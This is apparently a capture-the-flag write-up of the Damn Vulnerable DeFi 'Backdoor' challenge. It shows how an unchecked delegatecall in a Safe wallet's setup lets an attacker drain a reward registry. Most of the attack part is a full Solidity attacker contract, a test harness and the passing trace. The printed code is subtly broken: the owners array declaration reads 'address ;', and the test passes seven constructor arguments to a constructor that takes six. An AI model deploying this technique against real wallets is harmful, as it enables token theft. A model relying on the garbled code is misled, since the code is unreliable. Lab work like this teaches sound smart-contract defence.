# Backdoor Challenge

## Challenge Overview:

In this challenge, we are given a contract called WalletRegistry, which rewards users for creating a Safe wallet (a type of smart wallet). For each wallet registered, the registry sends 10 DVT tokens to the new wallet.


There are 4 users already registered as beneficiaries:

1. Alice
2. Bob
3. Charlie
4. David

The registry holds 40 DVT tokens in total (10 per user).
Your goal:

        Exploit the system and transfer all 40 DVT tokens to a recovery address — in a single transaction.




## Vulnerability Explaination:

 The core idea is to trick the wallet creation logic into executing malicious code during the setup of a new Safe wallet.

Here’s the catch:

1. When creating a new wallet via the SafeProxyFactory, there's an initializer parameter.

2. This initializer is used to delegatecall to any contract during the Safe's setup.

3. This delegatecall runs in the context of the Safe, meaning it can modify the Safe's storage (including approvals).

Even though the Safe looks like it's owned by Alice/Bob/etc., we (the attacker) can inject a delegatecall that approves us to move funds on behalf of the new wallet.


## VulnerableCode(in WalletRegistry.sol):
```solidity
if (bytes4(initializer[:4]) != Safe.setup.selector) {
    revert InvalidInitialization();
}
```
This just checks the initializer calls setup() but doesn’t validate the delegateCall target address.
Also:
```solidity
//// During setup, it executes this.delegateCall(to, data)

```
So you can provide:

1. to = address(attacker_contract)

2. data = abi.encodeCall(attacker.approveTokens(...))

Which runs your function inside the Safe!

That’s the backdoor.

## Exploit Strategy:

1. Deploy an attacker contract with a function that:

```solidity
function approveTokens(DamnValuableToken token, address attacker) external {
    token.approve(attacker, type(uint256).max);
}

```
2. For each beneficiary:

     Use the legitimate SafeProxyFactory to create a Safe wallet.

     Inside the initializer, embed a delegatecall to our attacker contract.

     The delegatecall causes the newly created Safe wallet to approve us.

3. As soon as the wallet is created:

     The registry automatically transfers 10 tokens to it.

     Immediately use transferFrom to steal the tokens from the new wallet.

4. Repeat for all 4 users → collect 40 DVT → send to recovery address.
   


All in a single transaction 

## Exploit Code:

```solidity
// challenge contract

 function test_backdoor() public checkSolvedByPlayer {
        //because the challenge only accept if there is a single transation
        BackDoorAttacker scater = new BackDoorAttacker(
            token,
            singletonCopy /*Safe wallet  */,
            walletFactory,
            users,
            recovery,
            walletRegistry,
            AMOUNT_TOKENS_DISTRIBUTED /*40 ether*/
        );
        scater.attack();
    }

//attacker Contract
contract BackDoorAttacker {
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;
    address[] beneficiaries;
    address recovery;

    constructor(
        DamnValuableToken _token,
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        address[] memory _beneficiaries,
        address _recovery,
        WalletRegistry _walletRegistry
    ) {
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        beneficiaries = _beneficiaries;
        recovery = _recovery;
    }

    function approveTokens(DamnValuableToken _token, address spender) external {
        _token.approve(spender, type(uint256).max);
    }

    function attack() external {
        for (uint i = 0; i < beneficiaries.length; i++) {
            address ;
            owners[0] = beneficiaries[i];

            bytes memory delegateCallData = abi.encodeCall(
                this.approveTokens,
                (token, address(this))
            );

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(this),
                    delegateCallData,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                1,
                walletRegistry
            );

            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}

```

## Proof of Exploit:

```css
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.03ms (3.22ms CPU time)

Ran 1 test suite in 36.77ms (6.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

```yaml

 VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return]
    ├─ [964] WalletRegistry::wallets(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0x638586a520Cf7fe0D5d26d42Ce6148dE4Dc2F433]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [856] WalletRegistry::beneficiaries(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [964] WalletRegistry::wallets(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0x7033C5922DB65A6DD48D061076431d61403490A3]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [856] WalletRegistry::beneficiaries(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [964] WalletRegistry::wallets(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0x983670C08Fd8C3e1B8A02520c8040B9550a81bb8]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [856] WalletRegistry::beneficiaries(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [964] WalletRegistry::wallets(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0x4B435f00E7cec80ac91d5dd13982629a35Ce63A1]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [856] WalletRegistry::beneficiaries(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [802] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 40000000000000000000 [4e19]
    ├─ [0] VM::assertEq(40000000000000000000 [4e19], 40000000000000000000 [4e19]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.03ms (3.22ms CPU time)
```


## Conclusion:
This challenge teaches the danger of blindly allowing delegatecall in contract initialization. Just one line of unchecked delegatecall during setup gave us full control over the Safe wallet..

Key Lessons:

1. Delegatecall executes in the caller's storage context — be cautious!

2. Validating the function selector (setup.selector) is not enough — also validate who and what it calls.

3. Safe contracts and proxy patterns are powerful, but they need careful initialization logic.




***For more info  this challenge visit Github***:[Visit]
(https://github.com/SCATERLABs/CTFs/blob/0465130a63d25a8078a39b3241c9a8c7e101b7f1/Dam-vulnerable-Defi/test/backdoor/Backdoor.t.sol)